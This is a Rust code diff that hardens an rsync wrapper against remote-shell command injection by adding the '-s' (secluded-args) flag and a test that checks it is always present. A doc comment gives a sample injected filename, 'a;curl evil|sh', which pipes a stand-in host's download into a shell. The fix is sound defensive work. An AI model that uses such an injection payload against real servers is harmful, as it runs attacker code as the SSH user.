@@ -905,6 +905,30 @@ fn shell_escape(s: &str) -> String {
     }
 }
 
+/// The rsync flags shared by upload and download.
+///
+/// `-s` / `--secluded-args` (CLAUDE-AV-B3-02) is the load-bearing one: it makes
+/// rsync send filenames (and most options) to the remote rsync over the
+/// protocol instead of on the remote shell command line. Without it, the remote
+/// path in the `user@host:path` spec is evaluated by the remote LOGIN SHELL, so
+/// a crafted remote filename (`a;curl evil|sh`, `$(...)`, backticks, a space, a
+/// newline) is interpreted there and runs as the SSH user on the server. The
+/// `Command::new("rsync").arg(&remote_spec)` form only protects the LOCAL shell;
+/// the remote-shell leg is exactly what `-s` closes.
+#[cfg(unix)]
+fn base_rsync_flags(config: &RsyncConfig) -> Vec<&'static str> {
+    // `-a` = archive (-t -p -r -l -g -o -D); `-s` = secluded-args (see above).
+    let mut flags = vec!["-a", "-s"];
+    if config.compress {
+        flags.push("-z");
+    }
+    if config.progress {
+        flags.push("--info=progress2");
+    }
+    flags.push("--stats");
+    flags
+}
+
 /// Download a remote file into `local_path` using delta sync.
 ///
 /// Pre-conditions enforced: rsync present locally, local file (if any) larger than
@@ -934,14 +958,9 @@ pub async fn rsync_download(
     let remote_spec = format!("{}@{}:{}", config.ssh_user, config.ssh_host, remote_path);
 
     let mut cmd = Command::new("rsync");
-    cmd.arg("-a"); // archive (includes -t, -p, -r, -l, -g, -o, -D)
-    if config.compress {
-        cmd.arg("-z");
+    for flag in base_rsync_flags(config) {
+        cmd.arg(flag);
     }
-    if config.progress {
-        cmd.arg("--info=progress2");
-    }
-    cmd.arg("--stats");
     cmd.arg("-e").arg(&ssh_arg);
     cmd.arg(&remote_spec);
     cmd.arg(local_path);
@@ -973,14 +992,9 @@ pub async fn rsync_upload(
     let remote_spec = format!("{}@{}:{}", config.ssh_user, config.ssh_host, remote_path);
 
     let mut cmd = Command::new("rsync");
-    cmd.arg("-a");
-    if config.compress {
-        cmd.arg("-z");
+    for flag in base_rsync_flags(config) {
+        cmd.arg(flag);
     }
-    if config.progress {
-        cmd.arg("--info=progress2");
-    }
-    cmd.arg("--stats");
     cmd.arg("-e").arg(&ssh_arg);
     cmd.arg(local_path);
     cmd.arg(&remote_spec);
@@ -1159,6 +1173,26 @@ mod tests {
         let escaped = shell_escape("it's");
         assert!(escaped.starts_with('\''));
         assert!(escaped.ends_with('\''));
+    }
+
+    #[test]
+    fn base_rsync_flags_always_include_secluded_args() {
+        // CLAUDE-AV-B3-02: `-s` must be present on every rsync invocation so a
+        // crafted remote filename can never reach the remote shell.
+        assert!(base_rsync_flags(&RsyncConfig::default()).contains(&"-s"));
+        let cfg = RsyncConfig {
+            compress: true,
+            progress: true,
+            ..Default::default()
+        };
+        let flags = base_rsync_flags(&cfg);
+        assert!(
+            flags.contains(&"-s"),
+            "secluded-args must survive with options"
+        );
+        assert!(flags.contains(&"-z"));
+        assert!(flags.contains(&"--info=progress2"));
+        assert!(flags.contains(&"--stats"));
     }
 
     #[test]
